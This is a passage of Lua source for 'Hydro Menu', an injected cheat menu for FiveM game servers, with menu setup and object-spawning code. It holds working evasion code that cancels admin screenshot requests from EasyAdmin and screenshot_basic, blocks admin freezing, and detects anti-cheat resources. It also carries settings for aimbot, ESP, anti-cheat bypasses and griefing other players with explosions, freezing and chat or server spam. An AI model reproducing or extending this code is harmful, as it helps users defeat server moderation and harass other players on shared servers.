		TrackingPlayer = nil,
		attatchedplayer = nil,
		attachtoplayer = false,
		playertofreeze = nil,
		freezeplayer = false,
		messageloopplayer = nil,
		messagetosend = ".",
		messagelooping = false,
		CargodPlayer = nil,
		cargoplaneloop = false,
		ExplosionLoop = false,
		ExplodingPlayer = nil,
		FlingingPlayer = false,
		FireWorkPlayer = nil,
		FireWorkLoop = false,
		FireWork2Player = nil,
		FireWork2Loop = false,
		SmokeLoop = false,
		SmokePlayer = nil,
		JesusLightLoop = false,
		JesusPlayer = nil,
		AlienLightLoop = false,
		ExplosionParticlePlayer = nil,
		AlienPlayer = nil,
		FlarePlayer = nil,
		FlareLoop = false,
		lighttroll = false,
		lighttrollingplayer = nil
	},
	AllOnlinePlayers = {
	    DPEmotes = {"dancesilly", "dancesilly6", "twerk", "headbutted", "dancehorse", "slapped", "bartender"},
		CurrentEmote = 1,
		IncludeSelf = true,
		ParicleEffects = {
			HugeExplosionLoop = false,
			ClownLoop = false,
			BloodLoop = false,
			FireworksLoop = false,
		},
		busingserverloop = false,
		cargoplaneserverloop = false,
		freezeserver = false,
		tugboatrainoverplayers = false,
		ExplodisionLoop = false,
		PTFXSpam = false,
	},
	ScriptOptions = {
		GGACBypass = false,
		SSBBypass = false,
		script_crouch = false,
		vault_doors = false,
		blocktakehostage = false,
		BlockBlackScreen = false,
		blockbeingcarried = false,
		BlockPeacetime = false
	},
	MiscOptions = {
		GlifeHack = false,
		UnlockAllVehicles = false,
		SpamServerChat = false,
		FlyingCars = false,
		ESPLines = false,
		ESPBones = false,
		ESPName = false,
		ESPBlips = false,
		ESPBlipDB = {},
		ESPBox = true,
		ESPBoxStyle = 1,
		ESPDistance = 1000.0,
	},
	MenuOptions = {
		DiscordRichPresence = false,
		Watermark = false
	},
	Keybinds = {
		OpenKey = 316,
		NoClipKey = 45,
		DriftMode = 999,
		RefilHealthKey = 999,
		RefilArmourKey = 999,
		AimBotToggleKey = 999,
	},
	ServerOptions = {
		ESXServer = false,
		VRPServer = false
	}
}

local rgbhud = false

local OnlinePlayerOptions = false

local mocks = 0

local selectedPlayer = 0
local selectedWeapon = nil

local FriendsList = {}
local TazeLoop = false
local TazeLoopingPlayer = nil

local policeheadlights = false

local SafeMode = false

local AntiCheats = {
	ATG = false,
	WaveSheild = false,
	AntiCheese = false,
	ChocoHax = false,
	BadgerAC = false,
	TigoAC = false,
	ESXAC = false,
	VAC = false,
}

local selDoorIndex = 1
local curDoorIndex = 1

local selClosedDoorIndex = 1
local curClosedDoorIndex = 1

local selClosedBreakIndex = 1
local curClosedBreakIndex = 1

local spawnedobjectslist = {}

function tablelength(T)
	local count = 0
	for _ in pairs(T) do count = count + 1 end
	return count
end


local function GetResources()
    local resources = {}
    for i = 1, GetNumResources() do
        resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

AddEventHandler('cmg3_animations:syncTarget', function(target)
	if HydroVariables.ScriptOptions.blocktakehostage then
		TriggerEvent("cmg3_animations:cl_stop")
	end
end)
AddEventHandler('cmg3_animations:Me', function(target)
	if HydroVariables.ScriptOptions.blocktakehostage then
		TriggerEvent("cmg3_animations:cl_stop")
	end
end)

AddEventHandler('CarryPeople:syncTarget', function(target)
	if HydroVariables.ScriptOptions.blocktakehostage then
		TriggerEvent("CarryPeople:cl_stop")
	end
end)
AddEventHandler('CarryPeople:Me', function(target)
	if HydroVariables.ScriptOptions.blocktakehostage then
		TriggerEvent("CarryPeople:cl_stop")
	end
end)

RegisterNetEvent('screenshot_basic:requestScreenshot')
AddEventHandler('screenshot_basic:requestScreenshot', function()
	CancelEvent()
end)

RegisterNetEvent('EasyAdmin:CaptureScreenshot')
AddEventHandler('EasyAdmin:CaptureScreenshot', function()
	CancelEvent()
end)

RegisterNetEvent('requestScreenshot')
AddEventHandler('requestScreenshot', function()
	CancelEvent()
end)

RegisterNetEvent('__cfx_nui:screenshot_created')
AddEventHandler('__cfx_nui:screenshot_created', function()
	CancelEvent()
end)

RegisterNetEvent('screenshot-basic')
AddEventHandler('screenshot-basic', function()
	CancelEvent()
end)

RegisterNetEvent('requestScreenshotUpload')
AddEventHandler('requestScreenshotUpload', function()
	CancelEvent()
end)

AddEventHandler('EasyAdmin:FreezePlayer', function(toggle)
	TriggerEvent("EasyAdmin:FreezePlayer", false)
end)

RegisterNetEvent('EasyAdmin:CaptureScreenshot')
AddEventHandler('EasyAdmin:CaptureScreenshot', function()
	PushNotification("You're screen is being screen shotted", 1000)
	TriggerServerEvent("EasyAdmin:TookScreenshot", "ERROR")
	CancelEvent()
end)

local year, month, day, hour, minute, second = GetLocalTime()

local InjectionTime = string.format("%02d/%02d/%04d", day, month, year) .. " " .. string.format("%02d:%02d", hour, minute)

Ham.printStr("Hydro Menu", "\n^1Hydro Menu Loaded!\nWelcome " .. Ham.getName() .. "\n^3F11 to open the menu\n^5Resource " .. GetCurrentResourceName() .."\n^6Version " .. HydroMenu.Version)
Ham.printStr("Hydro Menu", "\n^1Injected at " .. InjectionTime .. "\n")

Resources = GetResources()

-- Main Thread
	
Citizen.CreateThread(function()
	
	for i = 1, #Resources do
		if Resources[i] == "Badger-AntiCheat" then
			AntiCheats.BadgerAC = true
		elseif Resources[i] == "BadgerAntiCheat" then
			AntiCheats.BadgerAC = true
		elseif Resources[i] == "BadgerAntiCheat" then
			AntiCheats.BadgerAC = true
		elseif Resources[i] == "Tigo-Anticheat" then
			AntiCheats.TigoAC = true
		elseif Resources[i] == "TigoAnticheat" then
			AntiCheats.TigoAC = true
		elseif string.find(Resources[i], "Tigo") then
			AntiCheats.TigoAC = true
		elseif string.find(Resources[i], "VAC") then
			AntiCheats.VAC = true
		elseif string.find(Resources[i], "Badger") and string.find(Resources[i], "Anti") then
			AntiCheats.BadgerAC = true
		elseif string.find(Resources[i], "cheese") then
			AntiCheats.AntiCheese = true
		elseif string.find(Resources[i], "Choco") then
		    AntiCheats.ChocoHax = true
		elseif string.find(Resources[i], "esx") then
			HydroVariables.ServerOptions.ESXServer = true
		elseif string.find(Resources[i], "vrp") then
			HydroVariables.ServerOptions.VRPServer = true
		end
	end
	
	HydroMenu.CreateMenu('main', 'Hydra Menu', 'xnxx Menu')
	HydroMenu.CreateSubMenu('onlineplayerlist', 'main', 'Online Players')

	HydroMenu.CreateSubMenu('allplayeroptions', 'onlineplayerlist', 'All Player Options')
	HydroMenu.CreateSubMenu('attachpropsallplayeroptions', 'allplayeroptions', 'All Player Options > Prop Options')
	HydroMenu.CreateSubMenu('particleeffectsallplayeroptions', 'allplayeroptions', 'All Player Options > Particle Effects')
	HydroMenu.CreateSubMenu('triggereventsallplayeroptions', 'allplayeroptions', 'All Player Options > Trigger Events')

	HydroMenu.CreateSubMenu('selectedonlineplayr', 'onlineplayerlist', 'Selected Player Options')
	HydroMenu.CreateSubMenu('trollonlineplayr', 'selectedonlineplayr', 'Troll Options')
	HydroMenu.CreateSubMenu('attachpropstoplayer', 'selectedonlineplayr', 'Attach Options')
	HydroMenu.CreateSubMenu('pedspawningonplayer', 'selectedonlineplayr', 'Ped Spawning')
	HydroMenu.CreateSubMenu('particleeffectsonplayer', 'selectedonlineplayr', 'Pariticle Options')
	HydroMenu.CreateSubMenu('selectedPlayervehicleopts', 'selectedonlineplayr', 'Selected Player Vehicle Options')
	HydroMenu.CreateSubMenu('selectedplayerTriggerEvents', 'selectedonlineplayr', 'Trigger Events On Player')

	HydroMenu.CreateSubMenu('selfoptions', 'main', 'Self Options')
	HydroMenu.CreateSubMenu('selfmodellist', 'selfoptions', 'Self Options > Change Ped')
	HydroMenu.CreateSubMenu('visionoptions', 'selfoptions', 'Self Options > Vision Options')
	HydroMenu.CreateSubMenu('selfwardrobe', 'selfoptions', 'Self Options > Wardrobe')
	HydroMenu.CreateSubMenu('premadeoutfits', 'selfoptions', 'Wardrobe > Pre Made Outifts')
	HydroMenu.CreateSubMenu('superpowers', 'selfoptions', 'Self Options > Super Powers')
	HydroMenu.CreateSubMenu('collisionoptions', 'selfoptions', 'Self Options > Collisions')
	
	HydroMenu.CreateSubMenu('vehicleoptions', 'main', 'Vehicle Options')
	HydroMenu.CreateSubMenu('spawnvehicleoptions', 'vehicleoptions', 'Vehicle Spawner')

	HydroMenu.CreateSubMenu('funnyvehicles', 'spawnvehicleoptions', 'Funny Vehicles')

	HydroMenu.CreateSubMenu('spawnvehiclesettings', 'spawnvehicleoptions', 'Vehicle Spawner  Settings')
	HydroMenu.CreateSubMenu("selectectedcatagoryvehicleoptions", 'spawnvehicleoptions', 'Options')
	HydroMenu.CreateSubMenu('doorvehicleoptions', 'vehicleoptions', 'Vehicle Options > Doors')
	HydroMenu.CreateSubMenu('vehicletricks', 'vehicleoptions', 'Vehicle Options > Tricks')
	HydroMenu.CreateSubMenu('vehicleautopilot', 'vehicleoptions', 'Vehicle Auto Pilot')

	HydroMenu.CreateSubMenu('personalvehicle', 'vehicleoptions', 'Personal Vehicle')
	HydroMenu.CreateSubMenu('personalvehicleautopilot', 'personalvehicle', 'Personal Vehicle')

	HydroMenu.CreateSubMenu('Hydrocustoms', 'vehicleoptions', 'Hydro Customs')

	HydroMenu.CreateSubMenu('teleportoptions', 'main', 'Teleport Options')
	
	HydroMenu.CreateSubMenu('weaponoptions', 'main', 'Weapon Options')
	HydroMenu.CreateSubMenu('weaponaimbotsettings', 'weaponoptions', 'Aimbot')
	HydroMenu.CreateSubMenu('bulletoptions', 'weaponoptions', 'Bullet Options')
	HydroMenu.CreateSubMenu('weaponslist', 'weaponoptions', 'Selected Weapon Options')
	HydroMenu.CreateSubMenu('selectedweaponoptions', 'weaponslist', 'Weapon Name Here')

	HydroMenu.CreateSubMenu('worldoptions', 'main', 'World Options')
	HydroMenu.CreateSubMenu('weatheroptions', 'worldoptions', 'Weather Options')
	HydroMenu.CreateSubMenu('timeoptions', 'worldoptions', 'Time Options')

	HydroMenu.CreateSubMenu('miscellaneousoptions', 'main', 'Misc Options')
	HydroMenu.CreateSubMenu('hudoptions', 'miscellaneousoptions', 'Misc Options > Hud Colors')
	HydroMenu.CreateSubMenu('serveroptions', 'miscellaneousoptions', 'Server Options')
	HydroMenu.CreateSubMenu('anticheatdetections', 'miscellaneousoptions', 'Anticheat Options')
	HydroMenu.CreateSubMenu('espoptions', 'miscellaneousoptions', 'ESP Options')
	HydroMenu.CreateSubMenu('triggerevents', 'miscellaneousoptions', "Trigger Events")
	HydroMenu.CreateSubMenu('scriptoptions', 'miscellaneousoptions', "Script Options")
	
	HydroMenu.CreateSubMenu('objectslist', 'main', 'Objects List')
	HydroMenu.CreateSubMenu('selectedobjectsettings', 'objectslist', 'Object Settings')
	HydroMenu.CreateSubMenu('selectedobjectattachmentsettings', 'selectedobjectsettings', 'Object Attachment Settings')
	HydroMenu.CreateSubMenu('clearareaobjects', 'objectslist', 'Clear Area')
	
	HydroMenu.CreateSubMenu('menusettings', 'main', "Settings")
	HydroMenu.CreateSubMenu('menuthemes', 'menusettings', "Themes")
	HydroMenu.CreateSubMenu('keybinds', 'menusettings', "Keybinds")

	if tonumber(mOpenKey) == nil then
		HydroVariables.Keybinds.OpenKey = 208
	else
        HydroVariables.Keybinds.OpenKey = mOpenKey
	end

	PushNotification("Successfully Loaded!", 1000)
	PushNotification("Open Key  F11 ", 1000)

	FindACResource()
	FindDynamicTriggers()
	
	while true do

		if HydroVariables.MenuOptions.DiscordRichPresence then
			SetDiscordAppId(779447457884405782)
			SetDiscordRichPresenceAsset('WHO')
			SetDiscordRichPresenceAssetText("WHO MENU On top ( open F11 )")
			SetDiscordRichPresenceAssetSmall('discord')
			SetDiscordRichPresenceAssetSmallText('discord.gg/pcCzWbFbrU')
		end

		EnableControlAction(0, 208, true)

		if killmenu then
            break
		end

		curMenu = HydroMenu.CurrentMenu()

		HydroMenu.SetMenuProperty(curMenu, 'maxOptionCount', HydroMenu.UI.MaximumOptionCount)

		if curMenu ~= nil then
			if string.find(curMenu, "playr") or string.find(curMenu, "onplayer") or string.find(curMenu, "selectedPlayer") or  string.find(curMenu, "selectedplayer") or string.find(curMenu, "toplayer") then
				OnlinePlayerOptions = true
			else
				OnlinePlayerOptions = false
			end
	    end

		if HydroMenu.IsMenuOpened('main') then

			if HydroMenu.MenuButton('Online Player Options', 'onlineplayerlist', "Individual Players / All Players") then
			elseif HydroMenu.MenuButton('Self Options', 'selfoptions', "Godmode, Super Powers") then
			elseif HydroMenu.MenuButton('Vehicle Options', 'vehicleoptions', "Funny Vehicles, Rainbow Car") then
			elseif HydroMenu.MenuButton('Teleport Options', 'teleportoptions', "Teleport to a Location or Waypoint") then
			elseif HydroMenu.MenuButton('Weapon Options', 'weaponoptions', "Infinite Ammo, Explosive ammo") then
			elseif HydroMenu.MenuButton('World Options', 'worldoptions', "Set World Options") then
			elseif HydroMenu.MenuButton('Object Options', 'objectslist', "Spawned Objects") then
			elseif HydroMenu.MenuButton('Misc Options', 'miscellaneousoptions', "Anticheat Options, Script Options") then
			elseif HydroMenu.MenuButton('Settings', 'menusettings', "Change Menu Settings") then
			elseif HydroMenu.Button('Kill Menu', "", false, "You need to re-execute the menu if you Kill the Menu") then
				killmenu = true
				break;
				HydroMenu.CloseMenu()
			end
			
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('objectslist') then
			
			if HydroMenu.MenuButton("Clear Objects", "clearareaobjects") then
		    elseif HydroMenu.CheckBox("Object Spooner", fcam) then
				fcam = not fcam
				if fcam then
					FreeCameraMode = "Object Spooner"
					StartFreeCam(GetGameplayCamFov())
				else
					FreeCameraMode = false
					EndFreeCam()
				end
			elseif HydroMenu.Button("Create Object") then
				local model = HydroMenu.KeyboardEntry("Enter Model Name", 200)
				coords = GetEntityCoords(PlayerPedId())
				local obj = CreateObject(GetHashKey(model), coords, 1, 1, 1)
				SetEntityHeading(obj, GetEntityHeading(PlayerPedId()))
				SetEntityAsMissionEntity(obj, true, true)
			    cord = GetEntityCoords(obj)
				local Information = {ID = obj, AttachedEntity = nil, AttachmentOffset = {X = 	0, Y = 0, Z = 0, XAxis = 0, YAxis = 0, ZAxis = 0}}
				table.insert(HydroMenu.Objectlist, #HydroMenu.Objectlist + 1, Information)
				if cam and FreeCameraMode == "Object Spooner" then		
					local coords = GetCoordCamLooking()
					local retval, zz, normal = GetGroundZAndNormalFor_3dCoord(coords.x, coords.y, coords.z + 100)
                    SetEntityCoords(obj, coords.x, coords.y, zz)
				end
			end
			for i = 1, #HydroMenu.Objectlist do
				if HydroMenu.MenuButton(HydroMenu.Objectlist[i].ID, "selectedobjectsettings") then
					HydroMenu.ObjectOptions.currentObject = HydroMenu.Objectlist[i]
				end
				if not DoesEntityExist(HydroMenu.Objectlist[i].ID) then
					table.remove(HydroMenu.Objectlist, i)
                    break
				end
			end
			
			if IsDisabledControlJustPressed(0, 178) then
				ting = HydroMenu.menus[HydroMenu.currentMenu].currentOption	- 3
				if HydroMenu.menus[HydroMenu.currentMenu].currentOption > 3 then
					HydroMenu.menus[HydroMenu.currentMenu].currentOption = HydroMenu.menus[HydroMenu.currentMenu].currentOption - 1
					DeleteEntity(HydroMenu.Objectlist[ting].ID)
				end
			end
			
			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('selectedobjectsettings') then

			if HydroMenu.MenuButton("Attachment Options", "selectedobjectattachmentsettings") then
	        elseif HydroMenu.ValueChanger("Sensitivity", HydroMenu.ObjectOptions.Sensitivity, 0.01, {0.011, 10}, function(value)
				HydroMenu.ObjectOptions.Sensitivity = value
			end, true) then
			elseif HydroMenu.ValueChanger("X Coordinate", tonumber(string.format("%.2f", GetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID).x)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
				x, y, z = table.unpack(GetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID))
				SetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID, value, y, z)
			end) then
			elseif HydroMenu.ValueChanger("Y Coordinate", tonumber(string.format("%.2f", GetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID).y)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
				x, y, z = table.unpack(GetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID))
				SetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID, x, value, z)
			end) then
			elseif HydroMenu.ValueChanger("Z Coordinate", tonumber(string.format("%.2f", GetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID).z)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
				x, y, z = table.unpack(GetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID))
				SetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID, x, y, value)
			end) then
			elseif HydroMenu.ValueChanger("X Rotation", tonumber(string.format("%.2f", GetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID).x)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
				x, y, z = table.unpack(GetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID))
				SetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID, value, y, z)
			end) then
			elseif HydroMenu.ValueChanger("Y Rotation", tonumber(string.format("%.2f", GetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID).y)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
				x, y, z = table.unpack(GetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID))
				SetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID, x, value, z)
			end) then
			elseif HydroMenu.ValueChanger("Z Rotation", tonumber(string.format("%.2f", GetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID).z)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
				x, y, z = table.unpack(GetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID))
				SetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID, x, y, value)
			end) then
			elseif HydroMenu.Button("Set Entity Upright") then
				SetEntityRotation(HydroMenu.ObjectOptions.currentObject.ID, 0.0, 0.0, GetEntityHeading(HydroMenu.ObjectOptions.currentObject.ID))
			elseif HydroMenu.Button("Teleport Entity To Self") then
				SetEntityCoords(HydroMenu.ObjectOptions.currentObject.ID, GetEntityCoords(PlayerPedId()))
			elseif HydroMenu.CheckBox("Freeze / Unfreeze Entity", IsEntityStatic(HydroMenu.ObjectOptions.currentObject.ID)) then
				if IsEntityStatic(HydroMenu.ObjectOptions.currentObject.ID) then
					FreezeEntityPosition(HydroMenu.ObjectOptions.currentObject.ID, false)
				else
					FreezeEntityPosition(HydroMenu.ObjectOptions.currentObject.ID, true)
				end
			elseif HydroMenu.CheckBox("Collision", EntityCollision) then
				EntityCollision = not EntityCollision
				SetEntityCollision(HydroMenu.ObjectOptions.currentObject.ID, EntityCollision, true)
			elseif HydroMenu.Button("Delete Entity") then
				DeleteEntity(HydroMenu.ObjectOptions.currentObject.ID)
				HydroMenu.OpenMenu("objectslist")
			end
			
			HydroMenu.Display()

		elseif HydroMenu.IsMenuOpened('selectedobjectattachmentsettings') then

			if HydroMenu.Button("Detach Entity") then
				HydroMenu.ObjectOptions.currentObject.AttachedEntity = nil
				DetachEntity(HydroMenu.ObjectOptions.currentObject.ID)
			elseif HydroMenu.Button("Attach To Self") then
				HydroMenu.ObjectOptions.currentObject.AttachedEntity = PlayerPedId()
				AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), false, true, true)
			elseif HydroMenu.Button("Attach To Current Vehicle") then
				HydroMenu.ObjectOptions.currentObject.AttachedEntity = GetVehiclePedIsIn(PlayerPedId())
				AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), false, true, true)
			end

			if HydroMenu.ObjectOptions.currentObject.AttachedEntity then
				if HydroMenu.ValueChanger("Sensitivity", HydroMenu.ObjectOptions.Sensitivity, 0.01, {0.02, 10}, function(value)
					HydroMenu.ObjectOptions.Sensitivity = value
				end, true) then
				elseif HydroMenu.ValueChanger("X Coordinate", tonumber(string.format("%.2f", HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
					HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X = value
					AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, false, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), true, true)
				end) then
				elseif HydroMenu.ValueChanger("Y Coordinate", tonumber(string.format("%.2f", HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
					HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y = value
					AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, false, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), true, true)
				end) then
				elseif HydroMenu.ValueChanger("Z Coordinate", tonumber(string.format("%.2f", HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
					HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z = value
					AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, false, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), true, true)
				end) then
				elseif HydroMenu.ValueChanger("X Rotation", tonumber(string.format("%.2f", HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
					HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis = value
					AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, false, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), true, true)
				end) then
				elseif HydroMenu.ValueChanger("Y Rotation", tonumber(string.format("%.2f", HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
					HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis = value
					AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, false, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), true, true)
				end) then
				elseif HydroMenu.ValueChanger("Z Rotation", tonumber(string.format("%.2f", HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis)), HydroMenu.ObjectOptions.Sensitivity, {-math.huge, math.huge}, function(value)
					HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis = value
					AttachEntityToEntity(HydroMenu.ObjectOptions.currentObject.ID, HydroMenu.ObjectOptions.currentObject.AttachedEntity, 0, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.X, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Y, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.Z, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.XAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.YAxis, HydroMenu.ObjectOptions.currentObject.AttachmentOffset.ZAxis, true, true, false, IsEntityAPed(HydroMenu.ObjectOptions.currentObject.AttachedEntity), true, true)
				end) then
				end
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('clearareaobjects') then
			
			if HydroMenu.Button("Clear Area Of Objects") then
				for object in EnumerateObjects() do
					NetworkRequestControlOfEntity(object)
					DeleteEntity(object)
				end
			elseif HydroMenu.Button("Clear Area Of Vehicles") then
				for vehicle in EnumerateVehicles() do
					NetworkRequestControlOfEntity(vehicle)
					DeleteEntity(vehicle)
				end
			elseif HydroMenu.Button("Clear Area Of Peds") then
				for ped in EnumeratePeds() do
					if ped ~= PlayerPedId() and not IsPedAPlayer(ped) then
						NetworkRequestControlOfEntity(ped)
						DeleteEntity(ped)
					end
				end
			elseif HydroMenu.Button("Clear Object List") then
				HydroMenu.Objectlist = {}
			end

			HydroMenu.Display()
	
		elseif HydroMenu.IsMenuOpened('menuthemes') then
			if HydroMenu.CheckBox("RGB Rainbow", HydroMenu.UI.RGB) then
				HydroMenu.UI.RGB = not HydroMenu.UI.RGB
			elseif HydroMenu.ValueChanger("R", HydroMenu.rgb.r, 1, {0, 255}, function(val)
				HydroMenu.rgb.r = val
			end, true) then
			elseif HydroMenu.ValueChanger("G", HydroMenu.rgb.g, 1, {0, 255}, function(val)
				HydroMenu.rgb.g = val
			end, true) then
			elseif HydroMenu.ValueChanger("B", HydroMenu.rgb.b, 1, {0, 255}, function(val)
				HydroMenu.rgb.b = val
			end, true) then
			end

			HydroMenu.Display()
		elseif HydroMenu.IsMenuOpened('keybinds') then

			if HydroMenu.Button("Change Open Key", tostring(HydroVariables.Keybinds.OpenKey), false, "https://docs.fivem.net/docs/game-references/controls/") then

				local OpenKey = HydroMenu.KeyboardEntry("Enter Menu Open Key", 3)
			
				if tonumber(OpenKey) == nil then
					HydroVariables.Keybinds.OpenKey = 208
				else
					HydroVariables.Keybinds.OpenKey = OpenKey
				end

				PushNotification("Press ~o~Alt + B~w~ to reset the open key", 600)

			elseif HydroMenu.Button("Change Noclip Key", tostring(HydroVariables.Keybinds.NoClipKey), false, "https://docs.fivem.net/docs/game-references/controls/") then
				local NoClipKey = HydroMenu.KeyboardEntry("Enter Noclip Key", 3)
			
				if tonumber(NoClipKey) == nil then
					HydroVariables.Keybinds.NoClipKey = 56
				else
					HydroVariables.Keybinds.NoClipKey = NoClipKey
				end

			elseif HydroMenu.Button("Change Health Refill Key", tostring(HydroVariables.Keybinds.RefilHealthKey), false, "https://docs.fivem.net/docs/game-references/controls/") then
				local HealthRefilKey = HydroMenu.KeyboardEntry("Enter Health Refill Key", 3)
			
				if tonumber(HealthRefilKey) == nil then
					HydroVariables.Keybinds.RefilHealthKey = 999
				else
					HydroVariables.Keybinds.RefilHealthKey = HealthRefilKey
				end

			elseif HydroMenu.Button("Change Drift Key", tostring(HydroVariables.Keybinds.DriftMode), false, "https://docs.fivem.net/docs/game-references/controls/") then
				local DriftKey = HydroMenu.KeyboardEntry("Enter Drift Key", 3)
			
				if tonumber(DriftKey) == nil then
					HydroVariables.Keybinds.DriftMode = 999
				else
					HydroVariables.Keybinds.DriftMode = DriftKey
				end
